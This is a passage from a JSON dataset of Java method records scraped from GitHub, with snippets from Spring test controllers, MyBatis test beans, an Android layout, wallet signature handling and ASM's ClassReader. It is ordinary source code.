"https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 59229, "method_name": "concurrencyFailure", "class_name": "ExceptionTranslatorTestController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void concurrencyFailure() {\n        throw new ConcurrencyFailureException(\"test concurrency failure\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59230, "method_name": "methodArgument", "class_name": "ExceptionTranslatorTestController", "params": ["TestDTO"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void methodArgument(@Valid @RequestBody TestDTO testDTO) {\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59231, "method_name": "missingServletRequestPartException", "class_name": "ExceptionTranslatorTestController", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void missingServletRequestPartException(@RequestPart String part) {\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59232, "method_name": "missingServletRequestParameterException", "class_name": "ExceptionTranslatorTestController", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void missingServletRequestParameterException(@RequestParam String param) {\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59233, "method_name": "accessdenied", "class_name": "ExceptionTranslatorTestController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void accessdenied() {\n        throw new AccessDeniedException(\"test access denied!\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59234, "method_name": "unauthorized", "class_name": "ExceptionTranslatorTestController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void unauthorized() {\n        throw new BadCredentialsException(\"test authentication failed!\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59235, "method_name": "exceptionWithResponseStatus", "class_name": "ExceptionTranslatorTestController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void exceptionWithResponseStatus() {\n        throw new TestResponseStatusException();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59236, "method_name": "internalServerError", "class_name": "ExceptionTranslatorTestController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void internalServerError() {\n        throw new RuntimeException();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59237, "method_name": "getTest", "class_name": "TestDTO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getTest() {\n            return test;\n        }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 59238, "method_name": "setTest", "class_name": "TestDTO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setTest(String test) {\n            this.test = test;\n        }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 59239, "method_name": "getItems", "class_name": "Name", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Item>", "snippet": "  public List<Item> getItems() {\n    return items;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59240, "method_name": "setItems", "class_name": "Name", "params": ["List<Item>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setItems(List<Item> items) {\n    this.items = items;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59241, "method_name": "getId", "class_name": "Name", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getId() {\n    return id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59242, "method_name": "setId", "class_name": "Name", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(Integer id) {\n    this.id = id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59243, "method_name": "getFirstName", "class_name": "Name", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getFirstName() {\n    return firstName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59244, "method_name": "setFirstName", "class_name": "Name", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFirstName(String firstName) {\n    this.firstName = firstName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59245, "method_name": "getLastName", "class_name": "Name", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getLastName() {\n    return lastName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59246, "method_name": "setLastName", "class_name": "Name", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLastName(String lastName) {\n    this.lastName = lastName;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/sptests/Name.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59247, "method_name": "transformPixel", "class_name": "DarlokViewer", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int transformPixel(int pixel) {\n        int a = pixel >> 24 & 0xff;\n        int r = pixel >> 16 & 0xff;\n        int g = pixel >> 8 & 0xff;\n        int b = pixel >> 0 & 0xff;\n\n        int avg = (r+g+b)/3;\n\n        if (avg < 96) \n            avg = avg / 2;\n        else \n            avg = min(255, ((255-avg) / 2)+avg);\n\n        return (a << 24)+(avg << 16)+(avg << 8)+avg;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/util/DarlokViewer.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "ImageTransformer"], "modifiers": ["public"]}}, {"id": 59248, "method_name": "onMeasure", "class_name": "SimpleLayout", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n        int maxHeight = 0;\n        int maxWidth = 0;\n        int childState = 0;\n\n        // \u6d4b\u91cf\u5b50 View\n        for (int i = 0; i < getChildCount(); i++) {\n            final View child = getChildAt(i);\n            // \u88ab\u6d4b\u91cf\u7684\u5b50 View \u4e0d\u80fd\u662f\u9690\u85cf\u7684\n            if (child.getVisibility() != GONE) {\n                measureChildWithMargins(child, widthMeasureSpec, 0, heightMeasureSpec, 0);\n                final MarginLayoutParams params = (MarginLayoutParams) child.getLayoutParams();\n                maxWidth = Math.max(maxWidth, child.getMeasuredWidth() + params.leftMargin + params.rightMargin);\n                maxHeight = Math.max(maxHeight, child.getMeasuredHeight() + params.topMargin + params.bottomMargin);\n                childState = combineMeasuredStates(childState, child.getMeasuredState());\n            }\n        }\n\n        maxWidth += getPaddingLeft() + getPaddingRight();\n        maxHeight += getPaddingTop() + getPaddingBottom();\n\n        maxWidth = Math.max(maxWidth, getSuggestedMinimumWidth());\n        maxHeight = Math.max(maxHeight, getSuggestedMinimumHeight());\n\n        // \u6d4b\u91cf\u81ea\u8eab\n        setMeasuredDimension(resolveSizeAndState(maxWidth, widthMeasureSpec, childState),\n                resolveSizeAndState(maxHeight, heightMeasureSpec,\n                        childState << MEASURED_HEIGHT_STATE_SHIFT));\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/SimpleLayout.java", "stars": "1", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["final", "public"]}}, {"id": 59249, "method_name": "onLayout", "class_name": "SimpleLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onLayout(boolean changed, int l, int t, int r, int b) {\n        // \u904d\u5386\u5b50 View\n        for (int i = 0; i < getChildCount(); i++) {\n            final View child = getChildAt(i);\n            final MarginLayoutParams params = (MarginLayoutParams) child.getLayoutParams();\n            // \u5c06\u5b50 View \u653e\u7f6e\u5230\u5de6\u4e0a\u89d2\u7684\u4f4d\u7f6e\n            child.layout(getPaddingLeft() + params.leftMargin,\n                    getPaddingTop() + params.topMargin,\n                    getPaddingRight() + child.getMeasuredWidth() + params.rightMargin,\n                    getPaddingBottom() + child.getMeasuredHeight() + params.bottomMargin);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/SimpleLayout.java", "stars": "1", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["final", "public"]}}, {"id": 59250, "method_name": "generateLayoutParams", "class_name": "SimpleLayout", "params": ["AttributeSet"], "throws": null, "modifiers": ["public"], "return_type": "LayoutParams", "snippet": "    public LayoutParams generateLayoutParams(AttributeSet attrs) {\n        return new MarginLayoutParams(getContext(), attrs);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/SimpleLayout.java", "stars": "1", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["final", "public"]}}, {"id": 59251, "method_name": "generateDefaultLayoutParams", "class_name": "SimpleLayout", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "LayoutParams", "snippet": "    protected LayoutParams generateDefaultLayoutParams() {\n        return new MarginLayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/SimpleLayout.java", "stars": "1", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["final", "public"]}}, {"id": 59252, "method_name": "generateLayoutParams", "class_name": "SimpleLayout", "params": ["LayoutParams"], "throws": null, "modifiers": ["protected"], "return_type": "LayoutParams", "snippet": "    protected LayoutParams generateLayoutParams(LayoutParams p) {\n        return new MarginLayoutParams(p);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/SimpleLayout.java", "stars": "1", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["final", "public"]}}, {"id": 59253, "method_name": "isCanonical", "class_name": "Secp256k1SignIntercept", "params": ["byte"], "throws": null, "modifiers": ["static", "private"], "return_type": "boolean", "snippet": "    private static boolean isCanonical(byte[] sigs) {\n        return (sigs[0] & 0x80) == 0\n                && !(sigs[0] == 0 && ((sigs[1] & 0x80) == 0))\n                && (sigs[32] & 0x80) == 0\n                && !(sigs[32] == 0 && ((sigs[33] & 0x80) == 0));\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/encryption/interception/Secp256k1SignIntercept.java", "stars": "13", "class_props": {"extends": null, "implements": ["InterceptManager"], "modifiers": []}}, {"id": 59254, "method_name": "getId", "class_name": "Secp256k1SignIntercept", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return CONSTANTS.METHODS.SIGN;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/encryption/interception/Secp256k1SignIntercept.java", "stars": "13", "class_props": {"extends": null, "implements": ["InterceptManager"], "modifiers": []}}, {"id": 59255, "method_name": "getIntercept", "class_name": "Secp256k1SignIntercept", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Intercept", "snippet": "    public Intercept getIntercept() {\n        return new InterceptImpl();\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/encryption/interception/Secp256k1SignIntercept.java", "stars": "13", "class_props": {"extends": null, "implements": ["InterceptManager"], "modifiers": []}}, {"id": 59256, "method_name": "preIntercept", "class_name": "InterceptImpl", "params": ["Packet"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void preIntercept(@NonNull Packet packet) {\n            txHash = Objects.requireNonNull(\n                    Objects.requireNonNull(packet.getPayload(CONSTANTS.TAGS.TX_HASH))\n                            .toHex());\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/encryption/interception/Secp256k1SignIntercept.java", "stars": "13", "class_props": {"extends": null, "implements": ["Intercept"], "modifiers": ["final", "static", "private"]}}, {"id": 59257, "method_name": "postIntercept", "class_name": "InterceptImpl", "params": ["Packet"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void postIntercept(@NonNull Packet packet) {\n            final String publicKey = Objects.requireNonNull(packet.getPayload(CONSTANTS.TAGS.PUBLIC_KEY_HASH)).toHex();\n            final String signed = Objects.requireNonNull(packet.getPayload(CONSTANTS.TAGS.SIGNED)).toHex();\n\n            final byte[] signBytes = ByteFormatter.hex2bytes(signed);\n            if (!isCanonical(signBytes)) {\n                throw new RuntimeException(\"couldn't find a canonical signature\");\n            }\n\n            final byte[] signR = Arrays.copyOf(signBytes, 32);\n            final byte[] signS = Arrays.copyOfRange(signBytes, 32, 64);\n\n            final BigInteger publicKeyInt = new BigInteger(publicKey, 16);\n            final int recId = Signature.getRecoverIdFromSignature(publicKeyInt, new BigInteger(1, signR), new BigInteger(1, signS), Hex.decode(txHash));\n            final byte[] signBytesWithRecId = new byte[signBytes.length + 1];\n\n            System.arraycopy(signBytes, 0, signBytesWithRecId, 0, signBytes.length);\n            signBytesWithRecId[signBytesWithRecId.length - 1] = (byte) recId;\n\n            packet.getPayloads().put(CONSTANTS.TAGS.SIGNED, new Payload(signBytesWithRecId));\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/encryption/interception/Secp256k1SignIntercept.java", "stars": "13", "class_props": {"extends": null, "implements": ["Intercept"], "modifiers": ["final", "static", "private"]}}, {"id": 59258, "method_name": "readStream", "class_name": "ClassReader", "params": ["InputStream", "boolean"], "throws": ["IOException"], "modifiers": ["static", "private"], "return_type": "byte", "snippet": "  private static byte[] readStream(final InputStream inputStream, final boolean close)\n      throws IOException {\n    if (inputStream == null) {\n      throw new IOException(\"Class not found\");\n    }\n    try (ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {\n      byte[] data = new byte[INPUT_STREAM_DATA_CHUNK_SIZE];\n      int bytesRead;\n      while ((bytesRead = inputStream.read(data, 0, data.length)) != -1) {\n        outputStream.write(data, 0, bytesRead);\n      }\n      outputStream.flush();\n      return outputStream.toByteArray();\n    } finally {\n      if (close) {\n        inputStream.close();\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59259, "method_name": "getAccess", "class_name": "ClassReader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getAccess() {\n    return readUnsignedShort(header);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59260, "method_name": "getClassName", "class_name": "ClassReader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getClassName() {\n    // this_class is just after the access_flags field (using 2 bytes).\n    return readClass(header + 2, new char[maxStringLength]);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59261, "method_name": "getSuperName", "class_name": "ClassReader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSuperName() {\n    // super_class is after the access_flags and this_class fields (2 bytes each).\n    return readClass(header + 4, new char[maxStringLength]);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59262, "method_name": "getInterfaces", "class_name": "ClassReader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getInterfaces() {\n    // interfaces_count is after the access_flags, this_class and super_class fields (2 bytes each).\n    int currentOffset = header + 6;\n    int interfacesCount = readUnsignedShort(currentOffset);\n    String[] interfaces = new String[interfacesCount];\n    if (interfacesCount > 0) {\n      char[] charBuffer = new char[maxStringLength];\n      for (int i = 0; i < interfacesCount; ++i) {\n        currentOffset += 2;\n        interfaces[i] = readClass(currentOffset, charBuffer);\n      }\n    }\n    return interfaces;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59263, "method_name": "accept", "class_name": "ClassReader", "params": ["ClassVisitor", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void accept(final ClassVisitor classVisitor, final int parsingOptions) {\n    accept(classVisitor, new Attribute[0], parsingOptions);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59264, "method_name": "accept", "class_name": "ClassReader", "params": ["ClassVisitor", "Attribute", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void accept(\n      final ClassVisitor classVisitor,\n      final Attribute[] attributePrototypes,\n      final int parsingOptions) {\n    Context context = new Context();\n    context.attributePrototypes = attributePrototypes;\n    context.parsingOptions = parsingOptions;\n    context.charBuffer = new char[maxStringLength];\n\n    // Read the access_flags, this_class, super_class, interface_count and interfaces fields.\n    char[] charBuffer = context.charBuffer;\n    int currentOffset = header;\n    int accessFlags = readUnsignedShort(currentOffset);\n    String thisClass = readClass(currentOffset + 2, charBuffer);\n    String superClass = readClass(currentOffset + 4, charBuffer);\n    String[] interfaces = new String[readUnsignedShort(currentOffset + 6)];\n    currentOffset += 8;\n    for (int i = 0; i < interfaces.length; ++i) {\n      interfaces[i] = readClass(currentOffset, charBuffer);\n      currentOffset += 2;\n    }\n\n    // Read the class attributes (the variables are ordered as in Section 4.7 of the JVMS).\n    // Attribute offsets exclude the attribute_name_index and attribute_length fields.\n    // - The offset of the InnerClasses attribute, or 0.\n    int innerClassesOffset = 0;\n    // - The offset of the EnclosingMethod attribute, or 0.\n    int enclosingMethodOffset = 0;\n    // - The string corresponding to the Signature attribute, or null.\n    String signature = null;\n    // - The string corresponding to the SourceFile attribute, or null.\n    String sourceFile = null;\n    // - The string corresponding to the SourceDebugExtension attribute, or null.\n    String sourceDebugExtension = null;\n    // - The offset of the RuntimeVisibleAnnotations attribute, or 0.\n    int runtimeVisibleAnnotationsOffset = 0;\n    // - The offset of the RuntimeInvisibleAnnotations attribute, or 0.\n    int runtimeInvisibleAnnotationsOffset = 0;\n    // - The offset of the RuntimeVisibleTypeAnnotations attribute, or 0.\n    int runtimeVisibleTypeAnnotationsOffset = 0;\n    // - The offset of the RuntimeInvisibleTypeAnnotations attribute, or 0.\n    int runtimeInvisibleTypeAnnotationsOffset = 0;\n    // - The offset of the Module attribute, or 0.\n    int moduleOffset = 0;\n    // - The offset of the ModulePackages attribute, or 0.\n    int modulePackagesOffset = 0;\n    // - The string corresponding to the ModuleMainClass attribute, or null.\n    String moduleMainClass = null;\n    // - The string corresponding to the NestHost attribute, or null.\n    String nestHostClass = null;\n    // - The offset of the NestMembers attribute, or 0.\n    int nestMembersOffset = 0;\n    // - The offset of the PermittedSubtypes attribute, or 0\n    int permittedSubtypesOffset = 0;\n    // - The offset of the Record attribute, or 0.\n    int recordOffset = 0;\n    // - The non standard attributes (linked with their {@link Attribute#nextAttribute} field).\n    //   This list in the <i>reverse order</i> or their order in the ClassFile structure.\n    Attribute attributes = null;\n\n    int currentAttributeOffset = getFirstAttributeOffset();\n    for (int i = readUnsignedShort(currentAttributeOffset - 2); i > 0; --i) {\n      // Read the attribute_info's attribute_name and attribute_length fields.\n      String attributeName = readUTF8(currentAttributeOffset, charBuffer);\n      int attributeLength = readInt(currentAttributeOffset + 2);\n      currentAttributeOffset += 6;\n      // The tests are sorted in decreasing frequency order (based on frequencies observed on\n      // typical classes).\n      if (Constants.SOURCE_FILE.equals(attributeName)) {\n        sourceFile = readUTF8(currentAttributeOffset, charBuffer);\n      } else if (Constants.INNER_CLASSES.equals(attributeName)) {\n        innerClassesOffset = currentAttributeOffset;\n      } else if (Constants.ENCLOSING_METHOD.equals(attributeName)) {\n        enclosingMethodOffset = currentAttributeOffset;\n      } else if (Constants.NEST_HOST.equals(attributeName)) {\n        nestHostClass = readClass(currentAttributeOffset, charBuffer);\n      } else if (Constants.NEST_MEMBERS.equals(attributeName)) {\n        nestMembersOffset = currentAttributeOffset;\n      } else if (Constants.PERMITTED_SUBTYPES.equals(attributeName)) {\n        permittedSubtypesOffset = currentAttributeOffset;\n      } else if (Constants.SIGNATURE.equals(attributeName)) {\n        signature = readUTF8(currentAttributeOffset, charBuffer);\n      } else if (Constants.RUNTIME_VISIBLE_ANNOTATIONS.equals(attributeName)) {\n        runtimeVisibleAnnotationsOffset = currentAttributeOffset;\n      } else if (Constants.RUNTIME_VISIBLE_TYPE_ANNOTATIONS.equals(attributeName)) {\n        runtimeVisibleTypeAnnotationsOffset = currentAttributeOffset;\n      } else if (Constants.DEPRECATED.equals(attributeName)) {\n        accessFlags |= Opcodes.ACC_DEPRECATED;\n      } else if (Constants.SYNTHETIC.equals(attributeName)) {\n        accessFlags |= Opcodes.ACC_SYNTHETIC;\n      } else if (Constants.SOURCE_DEBUG_EXTENSION.equals(attributeName)) {\n        sourceDebugExtension =\n            readUtf(currentAttributeOffset, attributeLength, new char[attributeLength]);\n      } else if (Constants.RUNTIME_INVISIBLE_ANNOTATIONS.equals(attributeName)) {\n        runtimeInvisibleAnnotationsOffset = currentAttributeOffset;\n      } else if (Constants.RUNTIME_INVISIBLE_TYPE_ANNOTATIONS.equals(attributeName)) {\n        runtimeInvisibleTypeAnnotationsOffset = currentAttributeOffset;\n      } else if (Constants.RECORD.equals(attributeName)) {\n        recordOffset = currentAttributeOffset;\n        accessFlags |= Opcodes.ACC_RECORD;\n      } else if (Constants.MODULE.equals(attributeName)) {\n        moduleOffset = currentAttributeOffset;\n      } else if (Constants.MODULE_MAIN_CLASS.equals(attributeName)) {\n        moduleMainClass = readClass(currentAttributeOffset, charBuffer);\n      } else if (Constants.MODULE_PACKAGES.equals(attributeName)) {\n        modulePackagesOffset = currentAttributeOffset;\n      } else if (!Constants.BOOTSTRAP_METHODS.equals(attributeName)) {\n        // The BootstrapMethods attribute is read in the constructor.\n        Attribute attribute =\n            readAttribute(\n                attributePrototypes,\n                attributeName,\n                currentAttributeOffset,\n                attributeLength,\n                charBuffer,\n                -1,\n                null);\n        attribute.nextAttribute = attributes;\n        attributes = attribute;\n      }\n      currentAttributeOffset += attributeLength;\n    }\n\n    // Visit the class declaration. The minor_version and major_version fields start 6 bytes before\n    // the first constant pool entry, which itself starts at cpInfoOffsets[1] - 1 (by definition).\n    classVisitor.visit(\n        readInt(cpInfoOffsets[1] - 7), accessFlags, thisClass, signature, superClass, interfaces);\n\n    // Visit the SourceFile and SourceDebugExtenstion attributes.\n    if ((parsingOptions & SKIP_DEBUG) == 0\n        && (sourceFile != null || sourceDebugExtension != null)) {\n      classVisitor.visitSource(sourceFile, sourceDebugExtension);\n    }\n\n    // Visit the Module, ModulePackages and ModuleMainClass attributes.\n    if (moduleOffset != 0) {\n      readModuleAttributes(\n          classVisitor, context, moduleOffset, modulePackagesOffset, moduleMainClass);\n    }\n\n    // Visit the NestHost attribute.\n    if (nestHostClass != null) {\n      classVisitor.visitNestHost(nestHostClass);\n    }\n\n    // Visit the EnclosingMethod attribute.\n    if (enclosingMethodOffset != 0) {\n      String className = readClass(enclosingMethodOffset, charBuffer);\n      int methodIndex = readUnsignedShort(enclosingMethodOffset + 2);\n      String name = methodIndex == 0 ? null : readUTF8(cpInfoOffsets[methodIndex], charBuffer);\n      String type = methodIndex == 0 ? null : readUTF8(cpInfoOffsets[methodIndex] + 2, charBuffer);\n      classVisitor.visitOuterClass(className, name, type);\n    }\n\n    // Visit the RuntimeVisibleAnnotations attribute.\n    if (runtimeVisibleAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeVisibleAnnotationsOffset);\n      int currentAnnotationOffset = runtimeVisibleAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                classVisitor.visitAnnotation(annotationDescriptor, /* visible = */ true),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeInvisibleAnnotations attribute.\n    if (runtimeInvisibleAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeInvisibleAnnotationsOffset);\n      int currentAnnotationOffset = runtimeInvisibleAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                classVisitor.visitAnnotation(annotationDescriptor, /* visible = */ false),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeVisibleTypeAnnotations attribute.\n    if (runtimeVisibleTypeAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeVisibleTypeAnnotationsOffset);\n      int currentAnnotationOffset = runtimeVisibleTypeAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the target_type, target_info and target_path fields.\n        currentAnnotationOffset = readTypeAnnotationTarget(context, currentAnnotationOffset);\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                classVisitor.visitTypeAnnotation(\n                    context.currentTypeAnnotationTarget,\n                    context.currentTypeAnnotationTargetPath,\n                    annotationDescriptor,\n                    /* visible = */ true),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeInvisibleTypeAnnotations attribute.\n    if (runtimeInvisibleTypeAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeInvisibleTypeAnnotationsOffset);\n      int currentAnnotationOffset = runtimeInvisibleTypeAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the target_type, target_info and target_path fields.\n        currentAnnotationOffset = 